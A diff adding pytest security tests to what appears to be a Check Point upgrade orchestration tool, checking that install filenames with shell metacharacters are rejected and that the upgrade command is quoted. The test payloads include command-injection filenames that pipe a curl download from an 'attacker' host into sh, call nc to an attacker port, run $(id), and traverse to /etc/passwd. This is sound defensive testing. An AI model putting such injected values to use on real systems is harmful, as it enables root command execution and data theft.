@@ -3,12 +3,19 @@ from __future__ import annotations
 import asyncio
 import hashlib
 import io
+import shlex
 from pathlib import Path
 
 import pytest
 
 from chkp_cpuse_orch.credentials import CredentialStore, JobCredentialVault
-from chkp_cpuse_orch.errors import CredentialError, InventoryError, JobError, TransportError
+from chkp_cpuse_orch.errors import (
+    CredentialError,
+    InventoryError,
+    JobError,
+    PackageError,
+    TransportError,
+)
 from chkp_cpuse_orch.inventory import Host, Inventory, Role, Site
 from chkp_cpuse_orch.jobs import JobRunner
 from chkp_cpuse_orch.packages import PackageStore
@@ -710,3 +717,47 @@ def test_ensure_host_free_shared_with_cpuse_still_works(store: Store) -> None:
 
     store.insert_environment("default", credential_storage_enabled=True)
     ensure_host_free(store, "default", "anything")  # no jobs yet — must not raise
+
+
+# -- install filename safety (security) -------------------------------------------
+#
+# _run_upgrade interpolates the staged path into
+# ``upgrade_revert_image.sh <path> upgrade safe`` and sends it to an
+# expert-mode (root) pty. Neither the .img suffix test nor the build-number
+# regex excludes shell metacharacters, so submit_install must apply the
+# package-name allowlist itself. See services/spark_patching.py.
+
+
+@pytest.mark.parametrize(
+    "payload",
+    [
+        "x;curl http://attacker/p|sh;_1.img",
+        "a$(id)_1.img",
+        "a`id`_1.img",
+        "a b_1.img",
+        "../../etc/passwd_1.img",
+        "x|nc attacker 1234_1.img",
+    ],
+)
+def test_submit_install_rejects_shell_metacharacters_in_filename(
+    service: SparkPatchingService, transport: FakeTransport, payload: str
+) -> None:
+    """Each payload satisfies both the .img suffix check and the trailing
+    build-number regex — the allowlist is the only thing standing between
+    them and a root shell."""
+    with pytest.raises(PackageError, match="unsafe package filename"):
+        service.submit_install("default", "spark-01", payload, confirmed=True)
+    assert transport.interactive_shells == []  # never connected
+
+
+def test_install_command_is_shell_quoted_at_the_sink(
+    service: SparkPatchingService, store: Store, transport: FakeTransport
+) -> None:
+    """Defence in depth: even with a validated name, the sink quotes."""
+    job = service.submit_install("default", "spark-01", IMG, confirmed=True)
+    _run(service)
+    assert store.get_job(job.id) is not None
+    sent = [line for sh in transport.interactive_shells for line in sh.sent]
+    upgrade = [line for line in sent if "upgrade_revert_image.sh" in line]
+    assert upgrade, f"no upgrade command issued; sent={sent!r}"
+    assert shlex.split(upgrade[0])[1] == f"/storage/{IMG}"
